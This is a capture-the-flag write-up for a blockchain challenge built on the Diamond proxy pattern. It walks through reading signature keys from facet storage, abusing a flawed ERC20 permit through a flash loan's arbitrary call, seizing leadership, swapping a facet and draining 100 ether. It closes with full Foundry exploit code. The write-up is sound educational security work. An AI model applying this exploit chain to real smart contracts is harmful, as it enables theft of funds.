# Write-Up - Fullchain Them - Ectario

## Description

We've heard rumors about an online game that's rigged — players never seem to win.
After digging a little deeper, we uncovered that it's actually a kind of online casino, allegedly being used to launder money for a criminal organization...

We've managed to get our hands on the source code, and it looks like their contracts use the Diamond Proxy pattern in a way that feels... fishy.

If we could somehow seize the funds locked in their Pool, that would be ideal.
I'm counting on you!

- **Category:** Blockchain
- **Difficulty:** Insane
- **Files provided:**
    
    ```bash
    .
    ├── deploy
    │   └── DeployLocal.s.sol
    ├── description.md
    └── src
        └── contracts
            ├── Diamond.sol
            ├── external_lib
            │   ├── Address.sol
            │   ├── Context.sol
            │   ├── ECDSA.sol
            │   ├── ERC20.sol
            │   ├── math
            │   │   ├── Math.sol
            │   │   ├── Panic.sol
            │   │   ├── SafeCast.sol
            │   │   └── SignedMath.sol
            │   ├── MessageHashUtils.sol
            │   ├── Ownable.sol
            │   ├── ReentrancyGuard.sol
            │   └── Strings.sol
            ├── facets
            │   ├── DiamondCutFacet.sol
            │   ├── DiamondLoupeFacet.sol
            │   ├── MoneyGameFacet.sol
            │   ├── PoolFacet.sol
            │   ├── RandomizerFacet.sol
            │   └── RefreshLeaderFacet.sol
            ├── interfaces
            │   ├── IDiamondCut.sol
            │   ├── IDiamondLoupe.sol
            │   └── IFacet.sol
            ├── libraries
            │   ├── LibDiamond.sol
            │   ├── LibMoneyGame.sol
            │   ├── LibPoolStorage.sol
            │   └── LibRefreshLeader.sol
            ├── Setup.sol
            └── tokens
                ├── DevLead.sol
                └── DevToken.sol
    ```
    
- **Flag:** `PWNME{what_4_fullch41n_isnt_1t?___could_be_realL1f3_sh1t}`

## Lil’ context

This challenge is built around a modular smart contract architecture based on the [Diamond Standard (EIP-2535)](https://eips.ethereum.org/EIPS/eip-2535). The core of the system is the `Diamond` contract, which acts as a proxy delegating calls to various facet contracts. Each facet encapsulates a different piece of logic—`MoneyGameFacet`, `PoolFacet`, `RefreshLeaderFacet`, etc.—and can be added, removed, or replaced dynamically using `DiamondCutFacet`. The `DiamondLoupeFacet` provides introspection utilities to list available functions and facets.

All token logic is separated into two contracts: `DevToken`, a custom ERC20-like token with `permit` support and mint gating based on `devkeys`; and `DevLead`, likely an ERC721 NFT representing a leadership status. The system is backed by a set of utility libraries and shared storage patterns to comply with the Diamond architecture (`LibDiamond`, `LibPoolStorage`, etc.).

The player is only given the address of the `Setup` contract. This is their entry point, and it exposes enough surface to interact with the deployed system. All other logic is deployed and wired behind the scenes into the diamond and its facets. The goal is to navigate this composable system, understand how facets interact through the proxy, and find a path to solve the challenge.

## Access Control Architecture

![image.png](Write-Up%20-%20Fullchain%20Them%20-%20Ectario%201ceabf8fab9580acb58ed4fdf3ff7f30/image.png)

## Chall Deployment Setup

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {Diamond} from "../src/contracts/Diamond.sol";
import {DevToken} from "../src/contracts/tokens/DevToken.sol";
import {DevLead} from "../src/contracts/tokens/DevLead.sol";
import {DiamondCutFacet} from "../src/contracts/facets/DiamondCutFacet.sol";
import {DiamondLoupeFacet} from "../src/contracts/facets/DiamondLoupeFacet.sol";
import {RandomizerFacet} from "../src/contracts/facets/RandomizerFacet.sol";
import {RefreshLeaderFacet} from "../src/contracts/facets/RefreshLeaderFacet.sol";
import {MoneyGameFacet} from "../src/contracts/facets/MoneyGameFacet.sol";
import {PoolFacet} from "../src/contracts/facets/PoolFacet.sol";
import {IDiamondCut} from "../src/contracts/interfaces/IDiamondCut.sol";
import {IFacet} from "../src/contracts/interfaces/IFacet.sol";
import {Setup} from "../src/contracts/Setup.sol";
import {ERC20} from "../src/contracts/external_lib/ERC20.sol";
import {Ownable} from "../src/contracts/external_lib/Ownable.sol";

// cast interface src/contracts/facets/RefreshLeaderFacet.sol
interface IRefreshLeaderFacet {
    function getSelectors() external pure returns (bytes4[] memory selectors);
    function refreshLeader(address newLeader) external;
    function setTokensAddresses(address devtoken, address devlead) external;
}

interface ISetDiamond {
    function setDiamondAddr(address diamond) external;
}

interface IInitPool {
    function initPool(address devtoken, address devlead) external;
}

contract DeployDiamond is Script {
    address public constant mafia = 0xd99453Cc6931f922Ee749474bb5336d028E8B811;
    address SETUP_CONTRACT;
    address deployer;

    function run() external {
        vm.startBroadcast();
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        deployer = vm.addr(privateKey);

        DevToken devToken = new DevToken(deployer, 10000, mafia);
        DevLead devLead = new DevLead();

        DiamondCutFacet cutFacet = new DiamondCutFacet();
        Diamond diamond = new Diamond(address(devLead), address(cutFacet));

        bytes[20] memory devkeys; // REDACTED
        
        PoolFacet poolFacet = new PoolFacet(devkeys, address(diamond));
        DiamondLoupeFacet loupeFacet = new DiamondLoupeFacet();
        RandomizerFacet randomizer = new RandomizerFacet();
        MoneyGameFacet moneyGame = new MoneyGameFacet();
        RefreshLeaderFacet refresh = new RefreshLeaderFacet();

        (bool success, ) = payable(address(poolFacet)).call{value: 100 ether}("");
        require(success, "ETH transfer failed");

        devToken.initPoolAuthorization(address(diamond));
        ERC20(devToken).transfer(address(diamond), ERC20(devToken).balanceOf(deployer));

        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](5);
        cuts[0] = IDiamondCut.FacetCut({
            facetAddress: address(loupeFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: IFacet(address(loupeFacet)).getSelectors()
        });
        cuts[1] = IDiamondCut.FacetCut({
            facetAddress: address(poolFacet),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: IFacet(address(poolFacet)).getSelectors()
        });
        cuts[2] = IDiamondCut.FacetCut({
            facetAddress: address(randomizer),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: IFacet(address(randomizer)).getSelectors()
        });
        cuts[3] = IDiamondCut.FacetCut({
            facetAddress: address(moneyGame),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: IFacet(address(moneyGame)).getSelectors()
        });
        cuts[4] = IDiamondCut.FacetCut({
            facetAddress: address(refresh),
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: IFacet(address(refresh)).getSelectors()
        });

        IDiamondCut(address(diamond)).diamondCut(cuts, address(0), "");

        IRefreshLeaderFacet(address(diamond)).setTokensAddresses(address(devToken), address(devLead));
        ISetDiamond(address(diamond)).setDiamondAddr(address(diamond));
        IInitPool(address(diamond)).initPool(address(devToken),address(devLead));
        Ownable(devLead).transferOwnership(address(diamond));

        SETUP_CONTRACT = address(new Setup(address(devToken), address(devLead), address(diamond), address(poolFacet))); 

        vm.stopBroadcast();

        console.log("DEPLOYED SETUP:");
        console.log(SETUP_CONTRACT);

    }
}
```

In this setup, the `PoolFacet` is deployed as a standalone contract and funded directly with 100 ether using a low-level call. Unlike the typical usage of facets in the Diamond Standard—where all logic execution and state changes occur within the context of the Diamond via `delegatecall`—the `PoolFacet` here receives and holds ETH in its own contract storage. 

This diverges from standard Diamond architecture, where facets are not meant to hold value directly. Instead, they are intended to execute logic in the context of the Diamond, which acts as the single point of storage and ownership. 

The fact that `PoolFacet` manages its own balance means it can’t be interacted with purely through the Diamond’s delegatecalls for value transfers, making it a unique and intentional deviation in this challenge’s architecture. 

This design decision introduces a clear boundary between ETH held in the `PoolFacet` and the Diamond, and exploiting this separation is likely a key part of the challenge.

## Looking for an exploitation path

In `PoolFacet.sol`:

```solidity
...    
    modifier onlyPlayFacet() {
        // Selector of `play(uint256)`
        bytes4 selector = bytes4(keccak256("play(uint256)"));
        address playFacet = IDiamondLoupe(diamond).facetAddress(selector);
        require(msg.sender == playFacet, "Only play() facet can call this");
        _;
    }
...
    function transferFunds(address payable to, uint256 amount) external onlyPlayFacet {
        (bool success, ) = to.call{value: amount}("");
        require(success, "ETH transfer failed");
    }
...
```

The `transferFunds` function appears to be exactly what we want to use as the player, but there is a modifier that checks whether the caller is the `playFacet`—the facet that currently implements the `play(uint256)` function—which, of course, is not the case. So we’ll need to find a way to replace that address with one we control.

### **The problem: only the owner of the Diamond is allowed to perform a diamond cut.**

In `LibDiamond.sol` :

```solidity
...    
    function setDevLeadContract(address _devleadtoken) internal {
        DiamondStorage storage ds = diamondStorage();
        ds.devleadtoken = _devleadtoken;
    }

    function isContractOwner(address caller) internal view returns (bool) {
        return DevLead(diamondStorage().devleadtoken).isLeader(caller);
    }

    function enforceIsContractOwner(address caller) internal view {
        require(isContractOwner(caller), "LibDiamond: Must be contract owner");
    }
...
```

In `DevLead.sol` :

```solidity
...    
    function isLeader(address leader) external view returns (bool) {
        if (leader == owner()) {
            return true;
        }
        if (nextTokenId == 0) {
            return false;
        }
        return this.ownerOf(nextTokenId-1) == leader;
    }
...
```

This function defines the logic for determining whether a given address is considered the current "leader" in the context of the `DevLead` NFT.

- If the address is equal to the contract’s `owner()`, it is immediately considered the leader.
- If no tokens have been minted yet (`nextTokenId == 0`), there is no leader, and it returns false.
- Otherwise, the leader is the address that owns the last minted NFT (`nextTokenId - 1`), which effectively represents the most recent "leadership" claim.

This logic implies that leadership can be transferred by minting a new NFT to a different address, and that the latest token owner (by ID order) is the one considered in control—unless the contract owner overrides it.

Also, unlike typical Diamond implementations that store a simple `contractOwner` address, this setup delegates ownership authority to the `DevLead` NFT.

- The `DevLead` contract address is stored inside the Diamond's storage.
- Ownership checks (`isContractOwner`) are performed by querying the `isLeader(...)` function from the DevLead NFT.
- This means that control over the Diamond (e.g., the ability to perform a `diamondCut`) depends on whether the caller is recognized as the "leader" in the `DevLead` contract.

This design introduces a dynamic form of ownership where minting or transferring the relevant NFT can change who is allowed to manage and upgrade the Diamond.

### **So, how to mint it?**

The `mint` function in the `DevLead` contract uses the `onlyOwner` modifier from OpenZeppelin’s `Ownable.sol`. This modifier restricts access to the function, allowing only the current contract owner to call it. In this context, the `mint` function is declared as:

```solidity
function mint(address to, string memory _tokenURI) external onlyOwner
```

Since `onlyOwner` refers to the `owner()` function inherited from `Ownable`, the function is protected against external use by arbitrary addresses. Unless the caller is the contract’s current owner—which, based on the setup, is the Diamond contract itself—any external call to `mint` will revert. 

This means that players interacting with the system will not be able to mint leadership NFTs directly unless they find a way to have the Diamond contract execute the mint on their behalf.

### How can we, as an attacker, cause the Diamond contract to execute the `mint` function on our behalf?

While inspecting the facets, we find a place where the Diamond performs a mint:

```bash
ectario@pwnMachine:~/ctf/DevChalls/insane_final_blockchain(master⚡) » grep -ri "mint("                 
src/contracts/external_lib/ERC20.sol:    function _mint(address to, uint256 amount) internal virtual {
src/contracts/tokens/DevLead.sol:    function mint(address to, string memory _tokenURI) external onlyOwner {
src/contracts/tokens/DevToken.sol:        _mint(initSupplyReceiver, initialSupply);
src/contracts/tokens/DevToken.sol:    function mint(address to, uint256 amount, uint8 nextKey, bytes[] memory devkeys) public {
src/contracts/tokens/DevToken.sol:        _mint(to, amount);
----> src/contracts/facets/RefreshLeaderFacet.sol:        DevLead(devlead).mint(newLeader, "Leadership taken");  <---------------
```

In `RefreshLeaderFacet.sol` :

```solidity
...    
    function refreshLeader(address newLeader) external nonReentrant {
        LibRefreshLeader.Layout storage s = LibRefreshLeader.layout();
        address devtoken = s.devToken;
        address devlead = s.devLead;
        require(ERC20(address(devtoken)).balanceOf(newLeader) > ERC20(address(devtoken)).totalSupply() / 2, "Not enough tokens to be leader");
        // This contract must be the owner of DevLead contract
        DevLead(devlead).mint(newLeader, "Leadership taken");
    }
...
```

To become the leader through the `refreshLeader` function, the caller must satisfy a strict condition: they must hold more than half of the total supply of `DevToken`. The function checks this explicitly with:

```solidity
require(
    ERC20(address(devtoken)).balanceOf(newLeader) > ERC20(address(devtoken)).totalSupply() / 2,
    "Not enough tokens to be leader"
);

```

Only if this requirement is met does the function proceed to mint a `DevLead` NFT to the specified `newLeader`.

At this point in the challenge, however, we don’t have a single `DevToken` , so the next step, then, appears to be recovering all those `DevToken`.

### Gib’ me those tokens please

We can’t directly call the `mint` function since it’s restricted by `onlyOwner`, and that owner is the Diamond itself. However, we’ve seen that the `refreshLeader` function allows the Diamond to call the mint internally—**if** we control enough tokens.

So the immediate objective becomes clear: we need to find a way to obtain a large portion of the `DevToken`, ideally all of them. 

From the deployment script, we know that the total supply was initially minted to the deployer and then fully transferred to the Diamond. That means the tokens are now sitting inside the Diamond's balance.

We can explore whether there’s a facet using it—or doing sketchy stuff with it:

![image.png](Write-Up%20-%20Fullchain%20Them%20-%20Ectario%201ceabf8fab9580acb58ed4fdf3ff7f30/image%201.png)

Indeed, the PoolFacet seems to use it, noice.

In `PoolFacet.sol` :

```solidity
...    
    function deposit(uint256 amount) external {
        LibPoolStorage.PoolStorage storage ps = LibPoolStorage.poolStorage();
        address devtoken = ps.devtoken;
        ERC20(devtoken).transferFrom(msg.sender, address(this), amount);
        ps.balances[msg.sender] += amount;
        ps.totalLiquidity += amount;
        emit Deposit(msg.sender, amount);
    }

    function withdraw(uint256 amount) external {
        LibPoolStorage.PoolStorage storage ps = LibPoolStorage.poolStorage();
        require(ps.balances[msg.sender] >= amount, "Not enough funds");
        ps.balances[msg.sender] -= amount;
        ps.totalLiquidity -= amount;
        address devtoken = ps.devtoken;
        ERC20(devtoken).transfer(msg.sender, amount);
        emit Withdrawal(msg.sender, amount);
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant returns (bool) {
        LibPoolStorage.PoolStorage storage ps = LibPoolStorage.poolStorage();
        address devtoken = ps.devtoken;
        require(
            ps.balances[msg.sender] >= 3,
            "Not enough DevToken deposited to flashloan"
        );

        ERC20 devToken = ERC20(devtoken);
        uint256 balanceBefore = devToken.balanceOf(address(this));

        devToken.transfer(borrower, amount);
        target.functionCall(data);

        require(
            devToken.balanceOf(address(this)) >= balanceBefore,
            "Flashloan not repaid"
        );

        emit FlashloanExecuted(borrower, amount);
        return true;
    }
...
```

The PoolFacet contains three functions that interact directly with the `DevToken`: `deposit`, `withdraw`, and `flashLoan`. However, at this point, we do not own a single DevToken, which means we can’t use `deposit` or `withdraw`, as both require a non-zero token balance on our side.

Additionally, using `flashLoan` also appears to be restricted. A key condition in the function enforces that the caller must have previously deposited at least 3 DevTokens:

```solidity
require(
    ps.balances[msg.sender] >= 3,
    "Not enough DevToken deposited to flashloan"
);

```

This requirement blocks us from initiating a flash loan until we can somehow acquire a minimum of 3 DevTokens. That creates a circular problem: we need DevTokens to interact with the system, but we have no DevTokens to start with.

Despite this initial limitation, the `flashLoan` function seems like a promising avenue for later stages of the challenge. 

*(Since becoming the leader requires holding more than half of the total DevToken supply, and those tokens are currently held by the Diamond, flashloaning them temporarily might give us the balance required to pass the check in `refreshLeader` [in fact, that will not be possible but we will see later]. But to get to that point, our first objective is clear: we need to find a way to obtain at least 3 DevTokens to unlock access to `flashLoan`.)*

Let’s take a closer look at the token contract. Surprisingly, the `mint` function is declared as `public` and has **no access control modifier**—which is unexpected for a mint function:

```solidity
function mint(address to, uint256 amount, uint8 nextKey, bytes[] memory devkeys) public
```

There is no `onlyOwner`, no whitelist, and no other visible restriction on who can call it. However, upon reading the implementation, it becomes clear that minting is gated through a system of `devkeys`.

In `DevToken.sol` :

```solidity
...    
    function mint(address to, uint256 amount, uint8 nextKey, bytes[] memory devkeys) public {
        require(amount <= devkeys.length, "Amount must match number of devkeys");
        require(nextKey < amount, "Next key must be less than amount");
        
        for (uint256 i = nextKey; i < amount; i++) {
            require(!usedDevKeys[devkeys[i]], "Devkey already used");
            bytes32 messageHash = keccak256(abi.encodePacked("Developer key for mafia gang", i));
            address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(messageHash), devkeys[i]);
            require(signer == mafiaMember, "Invalid signature");
            usedDevKeys[devkeys[i]] = true;
        }

        _mint(to, amount);
    }
...
```

These `devkeys` appear to be secure signatures over messages of the form `"Developer key for mafia gangX"` (where `X` is some index). The contract validates that each provided `devkey` corresponds to such a message signed by an authorized mafia member—most likely the original deployer or an address hardcoded as trusted.

In short, anyone can call the `mint` function, but it won’t succeed unless they provide valid signatures for the expected messages. 

Our next objective is therefore to recover these devkeys—either from contract storage, logs, or whatever—so we can mint DevTokens and move forward in the challenge.

### Getting devkeys to move forward

By examining the deployment script, we can see that the `devkeys` are passed directly to the constructor of the `PoolFacet` contract. 

This is a critical detail: the `devkeys` are not stored in the Diamond’s storage via `delegatecall`—they are stored in the implementation contract’s own storage.

This distinction is important. In a standard Diamond architecture, all state is expected to reside in the Diamond itself, with facets acting as logic modules that operate within the Diamond’s context through `delegatecall`. However, in this case, the deployment explicitly stores data in the facet contract’s own storage, outside the Diamond's context.

***Note from Author: this setup is intentionally unorthodox. It’s meant to draw attention to the difference between storage in the proxy (Diamond) and storage in the implementation (facet). Normally, one would never persist important data in a facet’s constructor, but here it serves as a learning point.***

Because of this, we can simply read the storage slots of the `PoolFacet` contract directly on-chain to recover the `devkeys`. Once extracted, these signatures can be reused to mint DevTokens and progress in the challenge.

This is the snippet used to recover the `devkeys` using foundry ([storage doc](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)):

```solidity
        // bytes4(keccak256("flashLoan(uint256,address,address,bytes)")) = 0xab19e0c000000000000000000000000000000000000000000000000000000000        
        PoolFacet poolFacet = PoolFacet(payable(IDiamondLoupe(address(diamond)).facetAddress(bytes4(0xab19e0c0))));
        // The DevKeyManager struct starts at POOL_STORAGE_POSITION + 1
        // devkeys is a fixed-length bytes[20] array, so each element takes 1 slot (warning: they're signatures and thus 65bytes long => can't fit in one slot => one more keccak() to put them in the storage)
        // more info about storage in: https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html
        bytes[] memory devkeys = new bytes[](20);
        for (uint256 i = 0; i < 20; i++) {
            uint256 baseSlot = uint256(POOL_STORAGE_POSITION) + 1 + i;
            bytes32 dataSlot = keccak256(abi.encode(baseSlot));
            console2.log("devkeys[%s]:", i);
            bytes memory keyBytes;
            // j < 3 because we'll read 3 slots since 1 slot is 32bytes and we have 65bytes
            for (uint256 j = 0; j < 3; j++) {
                bytes32 word = vm.load(address(poolFacet), bytes32(uint256(dataSlot) + j));
                keyBytes = bytes.concat(keyBytes, word);
            }
            // Trunc for 65bytes
            bytes memory key65 = new bytes(65);
            for (uint256 k = 0; k < 65; k++) {
                key65[k] = keyBytes[k];
            }
            console2.logBytes(key65);
            devkeys[i] = key65;
        }
```

Basically it does:

- Retrieves the `PoolFacet` address from the Diamond by querying which facet implements the `flashLoan(uint256,address,address,bytes)` function (selector `0xab19e0c0`).
- Initializes a `bytes[]` array to hold the 20 `devkeys`.
- For each key (from index 0 to 19), computes the storage offset where the `bytes` value is stored using:
    
    ```
    dataSlot = keccak256(abi.encode(baseSlot + i))
    ```
    
- Reads 3 consecutive 32-byte storage slots starting from `dataSlot` to capture enough data (96 bytes) to reconstruct a 65-byte signature.
- Truncates the concatenated bytes down to exactly 65 bytes and stores it as a `devkey`.
- Logs each recovered `devkey` and saves it into the array for future use (e.g., calling `mint()` on the DevToken contract).

### What we have so far

So, we have the `devkeys` that allow us to mint DevTokens. We can mint up to 20 tokens in total, since we recovered 20 keys. We also know that becoming the DevLead requires holding at least a majority of all existing DevTokens. If we meet that condition, we can call `refreshLeader` with an address we control and become the leader.

Becoming the leader gives us ownership-level privileges over the Diamond, which we need in order to replace the facet that implements the `play(uint256)` function. This replacement is crucial because the `transferFunds` function in `PoolFacet` uses a modifier that restricts access based on which facet implements `play(uint256)`—effectively acting as access control.

What remains now is to find a way to obtain a majority of the DevTokens in circulation.

### Time to steal the leadership

We previously saw that the contract includes a flashloan mechanism, and now that we have the required 3 DevTokens, we might consider using the flashloan to temporarily borrow all DevTokens held by the Diamond. The idea would be to use this borrowed balance to call `refreshLeader` and become the leader during the flashloan.

However, there's a problem: both the `flashLoan` and `refreshLeader` functions are protected by the `nonReentrant` modifier. Since all facet calls in the Diamond are executed in the same storage context via `delegatecall`, the reentrancy guard will block any nested call from within `flashLoan` to `refreshLeader`.

In other words, while `flashLoan` is still executing, any attempt to call another `nonReentrant` function (like `refreshLeader`) from within the same transaction context will fail. Therefore, calling `refreshLeader` directly during the flashloan is not possible through conventional means, and we'll need to find another approach to bypass this restriction.

***This is probably the trickiest part of the challenge.***

By analyzing the `flashLoan` function, we can see that we control several key parameters: `amount`, `borrower`, `target`, and `data`. More importantly, during the execution of the flashloan, the contract will call **any function we specify**, on **any target contract**, with **any calldata we provide**.

This opens up the possibility of using the flashloan to make the Diamond contract grant us a persistent allowance—essentially giving us long-term access to the DevTokens even after the flashloan ends.

To do this, we need to look into the ERC20 implementation being used and identify which functions can modify allowances. The standard `approve` function is off-limits—it’s marked as `internal`, which is unusual and prevents us from calling it directly.

However, upon further inspection, we find an alternative: the `permit` function.

Comparing the original Solmate ERC20 implementation with the version used in this challenge reveals a number of differences. One of them stands out as particularly significant—and potentially highly exploitable.

```solidity
instead of: allowance[owner][spender] = value;
we got    : allowance[msg.sender][spender] = value;
```

We observe that the ownership check via signature in the `permit` function is ultimately irrelevant, because the resulting allowance is applied to the `msg.sender`'s approvals—not to the actual `owner` who signed the message.

This means we can forge a signature that grants ourselves permission to spend the Diamond’s DevTokens, and then make the Diamond call `permit` on itself during the flashloan, using our forged signature. As a result, the Diamond would permanently approve us to move its DevTokens, even after the flashloan ends.

### Eureka

We now have the full chain of execution:

attacker → devkeys → devtokens → majority of devtokens → devlead → replace facet to allow our own contract to call `transferFunds`.

## TL;DR

![image.png](Write-Up%20-%20Fullchain%20Them%20-%20Ectario%201ceabf8fab9580acb58ed4fdf3ff7f30/image%202.png)

## Final Exploit

`FakeFacet.sol` :

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {PoolFacet} from "../src/contracts/facets/PoolFacet.sol";

contract FakeFacet {
    function play(uint256 inputNumber) external payable {}
    function withdrawAll(address poolFacetContract, uint256 amount) external payable {
        PoolFacet(payable(poolFacetContract)).transferFunds(payable(msg.sender), amount);
    }
}
```

`Exploit.sol` :

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {Diamond} from "../src/contracts/Diamond.sol";
import {DevToken} from "../src/contracts/tokens/DevToken.sol";
import {DevLead} from "../src/contracts/tokens/DevLead.sol";
import {DiamondCutFacet} from "../src/contracts/facets/DiamondCutFacet.sol";
import {DiamondLoupeFacet} from "../src/contracts/facets/DiamondLoupeFacet.sol";
import {IDiamondLoupe} from "../src/contracts/interfaces/IDiamondLoupe.sol";
import {RandomizerFacet} from "../src/contracts/facets/RandomizerFacet.sol";
import {RefreshLeaderFacet} from "../src/contracts/facets/RefreshLeaderFacet.sol";
import {MoneyGameFacet} from "../src/contracts/facets/MoneyGameFacet.sol";
import {PoolFacet} from "../src/contracts/facets/PoolFacet.sol";
import {IDiamondCut} from "../src/contracts/interfaces/IDiamondCut.sol";
import {IFacet} from "../src/contracts/interfaces/IFacet.sol";
import {Setup} from "../src/contracts/Setup.sol";
import {ERC20} from "../src/contracts/external_lib/ERC20.sol";
import {FakeFacet} from "./FakeFacet.sol";

// cast interface src/contracts/facets/PoolFacet.sol
interface IPoolFacet {
    error AddressEmptyCode(address target);
    error AddressInsufficientBalance(address account);
    error FailedInnerCall();
    error ReentrancyGuardReentrantCall();

    event Deposit(address indexed user, uint256 amount);
    event FlashloanExecuted(address borrower, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    receive() external payable;

    function deposit(uint256 amount) external;
    function flashLoan(uint256 amount, address borrower, address target, bytes memory data)
        external
        returns (bool);
    function getSelectors() external pure returns (bytes4[] memory selectors);
    function transferFunds(address payable to, uint256 amount) external;
    function withdraw(uint256 amount) external;
}

// cast interface src/contracts/facets/RefreshLeaderFacet.sol
interface IRefreshLeaderFacet {
    function getSelectors() external pure returns (bytes4[] memory selectors);
    function refreshLeader(address newLeader) external;
}

contract Exploit is Script {
    bytes32 constant POOL_STORAGE_POSITION = keccak256("diamond.pool.storage");
    bytes32 private constant PERMIT_TYPEHASH = keccak256(
        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
    );

    DevToken devToken;
    DevLead devLead;
    Diamond diamond; 
    Setup setupContract;
    address attacker;

    function run() external {
        // 0x9A9f2CCfdE556A7E9Ff0848998Aa4a0CFD8863AE = address by default when deploying locally with anvil
        setupContract = Setup(0x9A9f2CCfdE556A7E9Ff0848998Aa4a0CFD8863AE);
        diamond = Diamond(payable(setupContract.diamond()));
        devToken = DevToken(setupContract.devToken());
        devLead = DevLead(setupContract.devLead());
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        attacker = vm.addr(privateKey);

        console2.log("================== Step 1 ==================");
        // bytes4(keccak256("flashLoan(uint256,address,address,bytes)")) = 0xab19e0c000000000000000000000000000000000000000000000000000000000
        PoolFacet poolFacet = PoolFacet(payable(IDiamondLoupe(address(diamond)).facetAddress(bytes4(0xab19e0c0))));
        // The DevKeyManager struct starts at POOL_STORAGE_POSITION + 1
        // devkeys is a fixed-length bytes[20] array, so each element takes 1 slot (warning: they're signatures and thus 65bytes long => can't fit in one slot => one more keccak() to put them in the storage)
        // more info about storage in: https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html
        bytes[] memory devkeys = new bytes[](20);
        for (uint256 i = 0; i < 20; i++) {
            uint256 baseSlot = uint256(POOL_STORAGE_POSITION) + 1 + i;
            bytes32 dataSlot = keccak256(abi.encode(baseSlot));
            console2.log("devkeys[%s]:", i);
            bytes memory keyBytes;
            // j < 3 because we'll read 3 slots since 1 slot is 32bytes and we have 65bytes
            for (uint256 j = 0; j < 3; j++) {
                bytes32 word = vm.load(address(poolFacet), bytes32(uint256(dataSlot) + j));
                keyBytes = bytes.concat(keyBytes, word);
            }
            // Trunc for 65bytes
            bytes memory key65 = new bytes(65);
            for (uint256 k = 0; k < 65; k++) {
                key65[k] = keyBytes[k];
            }
            console2.logBytes(key65);
            devkeys[i] = key65;
        }
        console2.log("");
        console2.log("DevKeys looted from storage!");
        console2.log("");
        console2.log("================== Step 2 ==================");
        vm.startBroadcast(privateKey);
        devToken.mint(attacker, 20, 0, devkeys);
        console2.log("DevToken attacker balance after minting:");
        console2.logUint(ERC20(devToken).balanceOf(attacker));

        console2.log("================== Step 3 ==================");
        (uint8 v, bytes32 r, bytes32 s, uint256 deadline) = permitForDevToken(address(diamond), 3, true);
        // we deposit the 3 devtokens needed for the flashloan
        IPoolFacet(payable(address(diamond))).deposit(3);
        address spender = attacker;
        uint256 value = devToken.balanceOf(address(diamond));
        // we create the payload asking the flashloan function to permit us
        (v, r, s, deadline) = permitForDevToken(attacker, value, false);
        bytes memory payload = abi.encodeWithSignature(
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            attacker,
            spender,
            value,
            deadline,
            v,
            r,
            s
        );
        // setup the backdoor for us, so even after the flashloan (of 0 tokens) we will have the rights to transfer the tokens
        IPoolFacet(payable(address(diamond))).flashLoan(0, attacker, address(devToken), payload);
        // now lets use the backdoor and transfer all tokens into our account
        ERC20(devToken).transferFrom(address(diamond), attacker, value);
        console2.log("DevToken attacker balance after using the backdoor:");
        console2.logUint(ERC20(devToken).balanceOf(attacker));

        console2.log("================== Step 4 ==================");
        // lets get the DevLead NFT by refreshing the leader
        IRefreshLeaderFacet(payable(address(diamond))).refreshLeader(attacker);
        console2.log("Attacker is the leader:");
        console2.logBool(devLead.isLeader(attacker));

        console2.log("================== Step 5 ==================");
        FakeFacet ourFakeFacetContract = new FakeFacet();
        bytes4[] memory funSelectors = new bytes4[](1);
        funSelectors[0] = ourFakeFacetContract.play.selector;

        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](1);
        cuts[0] = IDiamondCut.FacetCut({
            facetAddress: address(ourFakeFacetContract),
            action: IDiamondCut.FacetCutAction.Replace,
            functionSelectors: funSelectors
        });
        // so after this diamond cut, in OnlyPlayFacet:
        //      bytes4 selector = bytes4(keccak256("play(uint256)"));
        //      address playFacet = IDiamondLoupe(diamond).facetAddress(selector);
        // will become our contract, then our contract will be able to call the transferFunds function directly from the deployed contract PoolFacet
        IDiamondCut(address(diamond)).diamondCut(cuts, address(0), "");
        console2.log("Deployed new fake facet & replacing the moneygamefacet.play function => Success!");

        console2.log("================== Step 6 ==================");
        // lets just withdraw every ether from poolfacet contract
        uint256 balance = address(poolFacet).balance;
        ourFakeFacetContract.withdrawAll(address(poolFacet), balance);

        console2.log("Is challenge solved?");
        console2.logBool(setupContract.isSolved());
        vm.stopBroadcast();
    }

    function permitForDevToken(address spender, uint256 value, bool doPermit) internal returns (uint8 v, bytes32 r, bytes32 s, uint256 deadline) {
        deadline = block.timestamp + 1 hours;
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // we can use who ever we want as signer since the code just check whether the signature is valid but doesn't perform action USING the result (instead it uses msg.sender)
        address signer = vm.addr(privateKey);
        uint256 nonce = ERC20(devToken).nonces(signer);
        bytes32 digest = getPermitDigest(address(devToken), signer, spender, value, nonce, deadline);
        (v, r, s) = vm.sign(privateKey, digest);
        if (doPermit) {
            ERC20(devToken).permit(signer, spender, value, deadline, v, r, s);
        }
    }

    // This function will be used to generate the v r s values to follow the EIP 2612 (used by the DevToken since it implements the ERC20 from solmate)
    function getPermitDigest(
        address token,
        address owner,
        address spender,
        uint256 value,
        uint256 nonce,
        uint256 deadline
    ) public view returns (bytes32) {
        bytes32 domainSeparator = ERC20(token).DOMAIN_SEPARATOR();
        bytes32 structHash = keccak256(abi.encode(
            PERMIT_TYPEHASH,
            owner,
            spender,
            value,
            nonce,
            deadline
        ));

        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }

    receive() external payable {}
}
```